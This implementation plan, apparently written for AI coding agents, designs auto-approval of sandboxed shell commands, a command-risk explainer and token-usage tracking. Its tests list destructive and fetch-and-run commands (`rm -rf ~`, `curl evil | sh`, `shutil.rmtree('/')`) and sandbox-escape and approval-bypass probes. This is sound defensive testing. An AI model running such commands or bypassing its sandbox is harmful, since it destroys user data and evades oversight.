# Motion Studio — Fase 8: Approvazioni e consumi — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:**
- Commands that stay in the sandbox are approved automatically: on by default, and safe once verified live.
- Every approval and every automatic approval explains the command in plain language, using deterministic indicators.
- Tokens and cost are tracked per job, version, creative, project and day, with a live counter and a Usage page.
- Videos come out at a reasonable weight.

**Architecture:**
- `packages/shared/src/explain/`: a pure, deterministic shell analyzer and dictionary, used by the core (approval requests) and the web (rendering).
- Core:
  - the bridge registration carries `sandboxed`;
  - `approve` auto-allows Bash in sandboxed jobs when the workspace setting is on;
  - the stream parser reads usage;
  - a per-project `.studio/usage.jsonl` ledger feeds `GET /api/usage`.
- Web:
  - extends ApprovalCard, Conversation/Activity details, the shell (tokens button, activity center), the creative canvas, Brand and AppSettings (new Usage section);
  - ports the phase-8 parts of the prototype.

**Tech Stack:** TypeScript, zod, Fastify (core), React 19 (web), Vitest. No new dependencies.

**Spec:** `docs/superpowers/specs/2026-10-09-motion-studio-phase8-approvals-usage-design.md`. Read the program spec §2–§3 and the phase 7 UI conventions (`packages/web/src/ui`, `motion/`, tokens, the literal-color guard) as well.

## Global Constraints

**Task 1 gates everything.** If any live security check in spec §3.1 fails, stop after Task 1 and report to the orchestrator. Don't implement auto-approval.

**Auto-approve conditions.** Auto-allow happens **only** when all of these hold:
- `tool_name === 'Bash'`;
- the job is registered as sandboxed;
- the setting `autoApproveSandboxed` is true;
- `input.dangerouslyDisableSandbox !== true`.

Everything else keeps asking exactly as today.

**Explain module.**
- Deterministic, no dependencies, no `eval`, no regex with catastrophic backtracking: linear time, and tested with 20 KB hostile input in under 50 ms.
- When unsure it says `parsed: false`. It never guesses a benign explanation.
- The agent's `description` is shown only as a quote and never replaces indicators or phrases.

**Usage.**
- Tokens are the primary figure and cost is secondary.
- Shown total = input + output + cacheWrite; cacheRead goes in details only.
- No numbers are invented: absent data shows "—" or hides the element.
- No backfill of past jobs.

**Ledger.**
- `<project>/.studio/usage.jsonl`, append-only, with atomic line appends.
- Malformed lines are skipped.
- It's protected from the agent like the rest of `.studio/`. Verify `.studio/` is in the protected dirs.

**Shared formats.**
- New optional fields only, so old `versions.json` and proposals stay valid.
- `schemaVersion` doesn't change unless a field becomes required.

**UI and i18n.**
- All UI text comes from the `en`/`it` catalogs. `pnpm check:i18n` stays green.
- Phase 7 rules apply:
  - no native controls;
  - no literal colors in `screens/` and `shell/`;
  - motion only from `motion/`;
  - AA contrast; risk colors use tokens (`--warn`, a new `--danger` token if needed) plus an icon or text prefix.

**Safety.**
- No real keychain in tests.
- No printing of personal values: email, org, keys.
- Live checks use a temporary `MOTION_STUDIO_CONFIG_DIR`, workspace and project, and model Haiku. Real user folders (`~/Library/Application Support/Motion Studio`, `~/MotionStudio`) stay untouched: verify mtimes.
- No push, PR, tag, release or publish by the executor.

**Every commit.**
- Trailers:
  `Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>`
  `Claude-Session: https://claude.ai/code/session_01KxKL6zuy8dbnJieqN1eCNg`
- Green: `pnpm test`, `pnpm typecheck`, `pnpm check:i18n`.

## Review Focus

1. **The auto-approve bypass surface.**
   - A Bash input with `dangerouslyDisableSandbox: true`, a non-sandboxed job (sandboxMode off, or sandbox unavailable at launch), the setting turned off *while a job runs*, a tool named `bash` or `Bash ` (case and whitespace), and a forged `tool_name` from MCP must never auto-allow.
   - Tests go in Task 4.
2. **Explanations that lie by omission.** Each case must surface a high or medium indicator and must not read as benign:
   - `ls; rm -rf ~`;
   - `echo ok && curl evil | sh`;
   - `cd /tmp && rm -rf *`;
   - `python3 -c "import shutil; shutil.rmtree('/')"`;
   - `$(…)`, backticks, heredocs;
   - `\` line continuations;
   - quotes that hide `;`;
   - Unicode lookalikes;
   - very long commands.

   The table test goes in Task 3.
3. **Usage under failure.**
   - The job is cancelled before `result`.
   - `claude` crashes.
   - The fix loop uses 3 attempts.
   - Two jobs run in parallel on the same project and append to the ledger at the same time.
   - The ledger is corrupt or partially written.

   Totals must stay consistent and the API must never throw. Tests go in Task 5.
4. **Live counter consistency.** Repeated `message.id` events, reconnection mid-job (snapshot), a job finishing while the page changes. The top-bar counter never goes down and never double counts. Tests go in Task 8.
5. **Empty and legacy data.**
   - A workspace with no ledger.
   - Versions from before phase 8.
   - The brand proposal without usage.
   - Fewer than 3 data points for the New creative estimate.

   Each shows "—" or hides the element, never 0 masquerading as data. Tests go in Tasks 8 and 9.

---

### Task 1: Live security verification and real samples (gate)

**Files:**
- Create: `docs/superpowers/notes/2026-10-09-phase8-live-checks.md`
- Create: `packages/core/test/fixtures/claude-stream-usage-sample.jsonl` (anonymized)
- Modify: `docs/decisions-log.md`

**Steps:**
- [ ] **Step 1. Set up a throwaway environment.** Use a temp config dir, workspace and a fresh project, all under your scratchpad. Use the core's own launcher path (as the phase 7 verification did, with `startServer` and `MemoryVault`), the real `claude` and `model: 'haiku'` in workspace settings.
- [ ] **Step 2. Capture what approve receives.** Add a temporary debug log (not committed) in `bridge-routes.ts approve` that writes the raw `{tool_name, input}` to a file in the scratchpad.
- [ ] **Step 3. Run console or creative turns** that make the agent run the point-24 commands literally:
  - `time PYTHONPATH=x python3 -c "print(1)" 2>&1 | tail -1`
  - `pkill -f nonexistent-process-xyz; echo done`
  - `rm -rf work/tmp-probe && mkdir -p work/tmp-probe`
  
  Record which ones reach `approve`, the exact input shape (is `description` present? other fields?) and the cwd of the `claude` process.
- [ ] **Step 4. Check that an approved command can't escape the sandbox.** Approve the following via the API and check each has **no effect**:
  - **(a)** a write to a throwaway directory you create outside the project. First read the sandbox write allowlist from the settings JSON the launcher passed, and choose a location not covered by it. Never use the user's real folders.
  - **(b)** `curl -sS https://example.org`, a domain not on the allowlist. It must fail.
  - **(c)** the same write as (a) with `dangerouslyDisableSandbox: true` requested in the prompt. It must still fail.
  
  Delete the throwaway directory afterwards.
- [ ] **Step 5. Capture usage data.**
  - Save one full stream-json run, anonymized (strip session ids, paths, email, org; keep field names and numbers), to the fixture. Note the exact `usage`, `modelUsage` and per-message `message.usage` shapes.
  - Run `claude auth status --json` and record **only the field names** and which field distinguishes subscription from API key. Never paste values.
- [ ] **Step 6. Write it up.**
  - Write the notes file, with commands, results and shapes.
  - Append a "Fase 8 · verifica dal vivo" entry to `docs/decisions-log.md` (Italian, like the rest).
  - **If 4(a), 4(b) or 4(c) did not fail, stop here and report.**
  - Remove the debug log.
- [ ] **Step 7. Commit:** `docs: phase 8 live sandbox and usage checks`.

---

### Task 2: Shared types and settings

**Files:**
- Modify: `packages/shared/src/schemas.ts`
- Modify: `packages/shared/src/events.ts`
- Modify: `packages/shared/src/creative.ts`
- Modify: `packages/shared/src/brand.ts`
- Create: `packages/shared/src/usage.ts`
- Test: `packages/shared/test/usage-types.test.ts`
- Test: extend the settings schema tests

**Interfaces (Produces):**

```ts
// schemas.ts — workspaceSettingsSchema (and stored schema)
autoApproveSandboxed: z.boolean().default(true)

// usage.ts
export interface TokenCounts { input: number; output: number; cacheRead: number; cacheWrite: number }
export interface ModelUsage { model: string; tokens: TokenCounts; costUsd: number | null }
export interface UsageSummary { tokens: TokenCounts; costUsd: number | null; estimated?: boolean }
export const usageRecordSchema: z.ZodType<UsageRecord>; // ledger line
export interface UsageRecord { at: string; jobId: string; kind: 'creative'|'brand-analysis'|'describe'|'console';
  creativeSlug: string | null; version: number | null; attempt: number | null;
  tokens: TokenCounts; costUsd: number | null; models: ModelUsage[]; durationMs: number | null;
  outcome: 'ok'|'error'|'cancelled'; estimated?: boolean }
export function shownTotal(t: TokenCounts): number; // input + output + cacheWrite
export function addTokens(a: TokenCounts, b: TokenCounts): TokenCounts;
export interface UsageReport { from: string; to: string; total: UsageSummary; byDay: { day: string; tokens: number; costUsd: number | null }[];
  byProject: { slug: string; name: string; tokens: number; costUsd: number | null }[];
  byKind: { kind: UsageRecord['kind']; tokens: number; costUsd: number | null }[];
  trackedSince: string | null; billing: 'subscription' | 'api' | 'unknown' }

// events.ts
// AgentEvent gains:
| { kind: 'usage'; live: boolean; tokens: TokenCounts; costUsd: number | null; models?: ModelUsage[] }
| { kind: 'auto_approved'; toolName: string; command: string; explanation: Explanation }
// ApprovalRequest gains:
explanation: Explanation | null; agentReason: string | null;

// creative.ts — VersionEntry gains: usage?: UsageSummary
// brand.ts — BrandProposal gains: usage?: UsageSummary
```

**Note:** `Explanation` is defined in Task 3. Import its type from `./explain/index.js`, created there. Write Task 2's type import against a stub file that Task 3 fills in, or do Task 3 first if you prefer. Both orders are fine; keep each commit green.

- [ ] **Step 1. Failing tests:**
  - the settings default is `true` when the field is absent from an old settings.json;
  - `usageRecordSchema` rejects negative tokens and accepts `estimated`;
  - an old `VersionEntry` without `usage` still parses;
  - `shownTotal` excludes cacheRead.
- [ ] **Steps 2–4.** FAIL → implement → PASS. Update every exhaustive `switch` on `AgentEvent` in core and web: typecheck will list them. For now the web ignores the new kinds.
- [ ] **Step 5. Commit:** `feat(shared): auto-approve setting, usage types and events`.

---

### Task 3: Command explanation module

**Files:**
- Create: `packages/shared/src/explain/{index.ts,tokenize.ts,dictionary.ts,paths.ts,indicators.ts}`
- Modify: `packages/shared/src/index.ts` (export)
- Modify: `packages/shared/src/i18n/{en,it}.ts` (new `explain` section)
- Test: `packages/shared/test/explain-tokenize.test.ts`
- Test: `packages/shared/test/explain-table.test.ts`

**Interfaces (Produces):** exactly spec §4.1:
- `explainTool(toolName, input, ctx)`;
- the types `Explanation`, `Phrase`, `Indicator` and `IndicatorId` (the union of the ids in spec §4.4).

Phrases are `{ key, params }` with keys under `explain.*` in the catalogs (e.g. `explain.pipInstall`: "Installs Python packages: {packages}"). Add a helper `renderExplanation(e, t)` for the web, in shared, that returns strings.

**Tokenizer contract.**
- `tokenize(command) → { commands: SimpleCommand[]; parsed: boolean }`.
- `SimpleCommand = { argv: string[]; env: Record<string,string>; redirects: { op: '>'|'>>'|'<'|'2>'|'&>'; target: string }[]; wrappers: string[] }`, where `wrappers` covers `time`, `sudo`, `nohup`, `env`.
- Separators: `;`, `&&`, `||`, `|`, `&`, newline.
- `\`-newline continuations are joined.
- Bail out with `parsed: false` on: `$(`, backtick, `<<`, `eval`, `source`/`.`, `bash -c`/`sh -c`/`zsh -c`, unbalanced quotes, or more than 50 simple commands.

**Paths.** `classifyPath(p, ctx) → 'work'|'project'|'tmp'|'outside'|'unknown'`:
- relative paths resolve from the cwd recorded in Task 1, so the context needs `cwd` too;
- expand `~` and `$HOME`;
- `tmp` = `/tmp`, `/private/tmp`, `$TMPDIR`;
- treat globs conservatively: `*` in a path that resolves to the project root or above → `outside` when above.

**Steps:**
- [ ] **Step 1. Failing tokenizer tests:** quotes, escapes, separators, redirects, env prefixes, `time`, continuations, every bail-out case.
- [ ] **Step 2. Failing table test**, at least 80 rows of `[command, expected phrase keys, expected indicator ids, expected risk, parsed]`. It must include:
  - every command from `docs/visual-test-2026-10-08.md` points 5, 7, 8 and 24, verbatim;
  - common agent commands: ffmpeg encodes, ffprobe json, pip in a venv, npm install, `python3 render.py`, `mkdir -p`, `cp -r`, `sips -s format png`, `cwebp`;
  - the hostile cases from Review Focus 2;
  - non-Bash tools: Edit inside and outside the project, Read, WebFetch, an unknown MCP tool.
- [ ] **Step 3. Performance test:** 20 KB of `a;` repeated, 20 KB of nested quotes, 20 KB of a single word. Each must take under 50 ms.
- [ ] **Steps 4–5.** Implement → PASS. Add the `en`/`it` phrases. Italian must read naturally: "Installa i pacchetti Python: …".
- [ ] **Step 6. Commit:** `feat(shared): deterministic command explanation`.

---

### Task 4: Core — automatic approval and explained requests

**Files:**
- Modify: `packages/core/src/agent/policy.ts`
- Modify: `packages/core/src/agent/launcher.ts`
- Modify: `packages/core/src/bridge/bridge.ts`
- Modify: `packages/core/src/bridge/bridge-routes.ts`
- Modify: `packages/core/src/approvals/broker.ts`
- Test: extend `policy.test.ts` and `bridge-routes.test.ts`
- Test: create `packages/core/test/auto-approve.test.ts`

**Interfaces:**
- `buildAgentPolicy` gets `autoApproveSandboxed: boolean`. When sandboxed:
  - `autoAllowBashIfSandboxed = autoApproveSandboxed` for **every** kind;
  - `AUTO_BASH` is removed. Document this in a comment linking spec §3.2.
- `bridge.register({...})` gets `sandboxed: boolean` (the value computed in `launcher.ts`). `BridgeContext.sandboxed` is read-only.
- In `approve`:
  - read the **current** setting through `deps.settings()` at call time, so turning it off mid-job takes effect for the next request;
  - if the four conditions hold:
    - emit `c.emit({ kind: 'auto_approved', toolName, command, explanation })`;
    - return `{ behavior: 'allow', updatedInput: input }` without creating an approval;
  - the tool name comparison is exact: `'Bash'`.
- `broker.request` computes `explanation = explainTool(toolName, input, ctx)` and `agentReason` (trimmed `input.description`, max 300 chars, control characters stripped, `null` if absent). It adds both to `ApprovalRequest`. The title stays as a fallback for old clients.
- `auto_approved` events follow the existing event path for each job kind: conversation for creatives, `log.jsonl` for brand, broadcast for the others.

**Steps:**
- [ ] **Step 1. Failing tests:**
  - policy: autoAllow true or false per setting for all four kinds; unchanged when not sandboxed.
  - approve:
    - auto-allows in a sandboxed job with the setting on, and emits `auto_approved`;
    - asks when the setting is off;
    - asks when the job is not sandboxed;
    - asks with `dangerouslyDisableSandbox: true`;
    - asks for `bash`, `Bash `, `Write`, `WebFetch`, `provider:*`;
    - a setting turned off between two calls in the same job asks on the second call.
  - broker: the request carries `explanation` and `agentReason`; `agentReason` strips control characters and truncates.
- [ ] **Steps 2–4.** FAIL → implement → PASS.
- [ ] **Step 5. Commit:** `feat(core): approve sandboxed commands automatically, explained approval requests`.

---

### Task 5: Core — usage parsing, ledger and API

**Files:**
- Modify: `packages/core/src/agent/claude-stream-parser.ts`
- Create: `packages/core/src/usage/{usage-tracker.ts,usage-ledger.ts,usage-report.ts}`
- Modify: `packages/core/src/creatives/creative-turns.ts`
- Modify: `packages/core/src/brand/brand-analysis.ts`
- Modify: the describe job
- Modify: the console path in `app.ts`
- Modify: `packages/core/src/doctor.ts` (billing)
- Modify: the server routes (new `usage-routes.ts`)
- Modify: `packages/core/test/fixtures/fake-claude.mjs` (usage fields)
- Modify: `packages/web/src/api.ts` (`getUsage`)
- Test: `packages/core/test/{stream-usage,usage-ledger,usage-report,usage-routes}.test.ts`

**Interfaces:**
- **Parser.** Emits `{kind:'usage', live:true, ...}` from `assistant` events with `message.usage`. It keeps a per-run map `message.id → usage` and sends the **sum** of the map each time, throttled to at most 1 event per second per job. It emits `{kind:'usage', live:false, ...}` from `result`, with tokens from `usage`, `costUsd` from `total_cost_usd`, `models` from `modelUsage`, plus `durationMs` and `numTurns` on the result event. Field names come from the Task 1 sample.
- **`UsageTracker`**, one per `claude` run. It holds the last live and final usage. On run end:
  - writes one ledger line via `UsageLedger.append(projectDir, record)`;
  - if there was no final usage (cancel or crash) but there was a live estimate, writes it with `estimated: true` and `outcome: 'cancelled'|'error'`;
  - writes nothing if there was neither.
- **`UsageLedger`.**
  - `append` uses `fs.appendFile` of a single line (O_APPEND keeps concurrent appends from two jobs whole) and validates with `usageRecordSchema` first.
  - `read(projectDir, {from,to})` streams lines and skips malformed ones.
- **Versions and proposals.** The version's `usage` is the sum of the attempt records for that version: set it when `appendVersion` runs. Brand proposals get theirs when the proposal is saved.
- **`GET /api/usage?from&to&project`** returns a `UsageReport`.
  - Defaults: the last 7 local days. Days are bucketed in the **server's local timezone**; return the timezone offset used.
  - `billing` comes from doctor's auth check, cached.
  - Requires the UI token like every route.
  - `trackedSince` is the earliest `at` across the ledgers.
- **Fake claude.** `result` includes `usage` and `modelUsage` with fixed numbers. Add a scenario `usage_stream` that emits two assistant messages with repeated `message.id`.

**Steps:**
- [ ] **Step 1. Failing tests:**
  - parser on the Task 1 fixture: the right totals, with repeated ids counted once;
  - tracker: cancel before result writes an estimated record; crash with no usage writes nothing;
  - ledger:
    - concurrent appends from two trackers produce 2 valid lines;
    - a corrupt line in the middle is skipped;
    - a partially written last line is skipped;
  - version usage is the sum of 3 fix-loop attempts;
  - report: byDay buckets across midnight in local time, byProject, byKind, `trackedSince`, an empty workspace (all zero arrays, `trackedSince: null`);
  - route: returns 401 without a token.
- [ ] **Steps 2–4.** FAIL → implement → PASS.
- [ ] **Step 5. Commit:** `feat(core): token and cost tracking with per-project ledger and usage API`.

---

### Task 6: Core — lighter outputs (point 27)

**Files:**
- Modify: the format catalog in `packages/shared` (it's where `getFormats` data lives)
- Modify: the delivery prompt builder in core
- Modify: output validation
- Modify: `OutputFileInfo` (`warnings?: string[]`)
- Test: extend the catalog, prompt and validation tests

**Interfaces:**
- Formats gain optional `maxFileMB?: number` and `targetBitrateKbps?: number`. Set values for video formats with a one-line source or rationale comment for each channel. Use conservative values: Instagram and TikTok reels around 8–15 MB for ≤ 60 s.
- The prompt adds the encoding guidance from spec §6, as text in the existing prompt templates in both languages if prompts are localized.
- Validation adds a **warning**, not a problem, when the file size exceeds `maxFileMB`:
  - warning key `outputs.largeFile` with params `{sizeMB, maxMB, channel}`;
  - the warning is stored in `OutputFileInfo.warnings`;
  - warnings never trigger the fix loop.

**Steps:**
- [ ] **Step 1. Failing tests:**
  - a 78 MB file on a reel with `maxFileMB: 15` produces a warning and the version stays `complete`;
  - a file under the limit has no warning;
  - the prompt contains `+faststart` and `yuv420p`.
- [ ] **Steps 2–4.** FAIL → implement → PASS.
- [ ] **Step 5. Commit:** `feat(core): encoding guidance and large-file warnings`.

---

### Task 7: Web — explained approvals, automatic approvals and the setting

**Files:**
- Modify: `packages/web/src/components/ApprovalCard.tsx`
- Modify: `packages/web/src/components/Conversation.tsx` (Activity details and turn summary)
- Modify: `packages/web/src/screens/ProjectSettings.tsx` (AgentCard toggle)
- Modify: `theme.css` (`--danger`/`--dangerBg` if needed, light and dark, AA)
- Modify: the catalogs
- Test: extend `approval-card.test.tsx`, `conversation.test.tsx` and `ProjectSettings.test.tsx`

**Requirements:**
- **ApprovalCard**, ported from the prototype `ApprovalCard` (`app.js:~95–110`):
  - the title is the rendered summary phrases, joined;
  - indicator chips in risk order with an icon per risk;
  - `agentReason` as a muted quote "The agent says: “…”";
  - "Show command" unchanged;
  - if `explanation` is null (old core), fall back to the phase 7 rendering.
- **Activity details.**
  - Each `auto_approved` event is a compact row: a check icon, the summary phrase and indicator chips. Expanding it shows the command.
  - At the end of a turn the chat shows "N commands ran automatically in the sandbox · Details" when N > 0, as a compact line, not a bubble.
- **Settings.**
  - Toggle "Approve sandboxed commands automatically" with the spec text, in AgentCard, marked "Shared by every project".
  - Disabled with the reason "Needs agent isolation" when `sandboxMode` is off or the doctor says the sandbox is unavailable.
  - Toasts as in the prototype.

**Steps:**
- [ ] **Step 1. Failing tests:**
  - the card shows phrases, chips (`high` has the danger class and an icon) and the quote;
  - the quote is absent without `agentReason`;
  - fallback without `explanation`;
  - 3 `auto_approved` events give 3 rows and the summary "3 commands ran automatically";
  - the toggle calls `updateSettings({autoApproveSandboxed:false})` and is disabled with sandbox off.
- [ ] **Steps 2–4.** FAIL → implement → PASS.
- [ ] **Step 5. Commit:** `feat(web): explained approvals, automatic-approval log and setting`.

---

### Task 8: Web — live tokens, activity center, creative and brand usage

**Files:**
- Modify: the `eventsReducer` (per-job live usage, today's total)
- Create: `shell/Tokens.tsx`
- Modify: `shell/TopBars.tsx`
- Modify: `shell/ActivityCenter.tsx`
- Modify: `screens/CreativeCanvas.tsx` (live counter, version card, version menu, creative total)
- Modify: `screens/Brand.tsx` (analysis card, Analyses list)
- Test: `test/usage-live.test.tsx`
- Test: extend the shell, canvas and brand tests

**Requirements (spec §5.4):**
- **Today's total.**
  - At startup: `GET /api/usage?from=<local midnight>`.
  - Then add each job's live delta. The reducer keeps per-job `lastSeen` and adds only `new - lastSeen`, clamped at ≥ 0.
  - On the final event, replace the job's contribution with the final value.
  - On reconnect (snapshot), refetch and reset the per-job state.
- **Tokens button** in every top bar: ghost, mono, with `k` formatting at 1 decimal. It opens `#/settings/usage`.
- **Activity center:**
  - footer "Today · Nk tokens · Usage";
  - Running rows show live tokens;
  - Done rows show the final tokens.
- **Canvas:**
  - live counter beside the status pill while a job runs;
  - the version card in chat shows "Nk tokens · $X" with a tooltip that splits input, output, cache write and cache read, plus the billing note;
  - the version menu shows tokens per version;
  - the creative total goes in the Brief panel;
  - versions without `usage` show nothing.
- **Brand:** the analysis card and the Analyses rows show tokens when present.
- **Cost labels** follow the billing rule (spec §5.3).

**Steps:**
- [ ] **Step 1. Failing tests:**
  - a repeated live event doesn't double count;
  - the final event replaces the live value;
  - reconnect refetches;
  - the counter never decreases across live → final;
  - a version without usage shows no tokens;
  - the billing label for `subscription` mentions the plan.
- [ ] **Steps 2–4.** FAIL → implement → PASS.
- [ ] **Step 5. Commit:** `feat(web): live token counter, activity center usage, per-version and per-analysis tokens`.

---

### Task 9: Web — Settings → Usage, New creative estimate, large-file warnings

**Files:**
- Modify: `routes.ts` (add `usage` to the settings sections; update `routes.test.ts`, which currently expects a fallback)
- Modify: `screens/AppSettings.tsx` (Usage section, ported from the prototype `UsageCard`)
- Modify: `screens/NewCreative.tsx` (estimate line)
- Modify: the canvas board and the version card (large-file warning)
- Test: `test/usage-settings.test.tsx`
- Test: extend the NewCreative and canvas tests

**Requirements:**
- **Usage section:**
  - 7-day bars with today in accent: real days, labeled, scaled to the max, with zero-height days drawn as a hairline;
  - the week total;
  - by-project rows and by-kind rows;
  - the billing note;
  - "Tracked since <date>";
  - empty state when `trackedSince` is null: "Usage appears here after your first generation".
- **New creative estimate:**
  - fetch the usage report for the last 90 days with `kind=creative` and first-generation records (`version === 1`, all attempts summed);
  - if there are 3 or more data points, show "Similar creatives used about N–M k tokens" using the 25th to 75th percentile;
  - otherwise show no line.
  - Add a query param or a small dedicated endpoint if needed.
- **Large-file warnings:**
  - a warning chip on the board ("78 MB · large") with a tooltip giving the recommendation;
  - a line in the version card.

**Steps:**
- [ ] **Step 1. Failing tests:**
  - bars scale and today is accented;
  - empty state;
  - the estimate is hidden with 2 data points and shown with 3;
  - the warning chip appears for an output with a `largeFile` warning.
- [ ] **Steps 2–4.** FAIL → implement → PASS.
- [ ] **Step 5. Commit:** `feat(web): usage page, generation estimate from history, large-file warnings`.

---

### Task 10: Live end-to-end verification and docs

**Files:**
- Modify: `README.md` (Security: automatic approval; How it works: usage)
- Modify: `docs/visual-test-2026-10-08.md` (mark 3, 5, 7, 8, 24, 27, 30)
- Modify: `docs/superpowers/notes/2026-10-09-phase8-live-checks.md` (append)
- Modify: `docs/decisions-log.md`

**Steps:**
- [ ] **Step 1. Run a creative.**
  - Use a throwaway environment as in Task 1, with real `claude`, Haiku, `autoApproveSandboxed` on and the built UI.
  - Generate a 6 s creative with Reel 9:16 and Post 1:1, then one change request.
  - Count the approval requests that reached the user: the target is **0** for sandboxed commands. Count the `auto_approved` events. Confirm the ledger has records and that `/api/usage` and the UI show the same totals.
  - Check output weights against the limits.
- [ ] **Step 2. Run a brand analysis** on `https://example.com`. Count the approvals (target 0) and check usage on the analysis.
- [ ] **Step 3. Run the creative again with the setting off.** Approvals appear, and each card shows phrases, indicators and the agent's reason when present.
- [ ] **Step 4. Screenshots**, in light and dark at 1440 px:
  - the approval card;
  - Activity details with automatic approvals;
  - Settings → Usage;
  - the tokens button and activity center;
  - the version card with tokens;
  - the large-file chip (use a synthetic large output if Haiku's outputs are small).
  
  Compare them with the prototype.
- [ ] **Step 5. Update docs.** Real user folders must be untouched: check the mtimes.
- [ ] **Step 6. Commit:** `docs: phase 8 verification, README security and usage notes`.
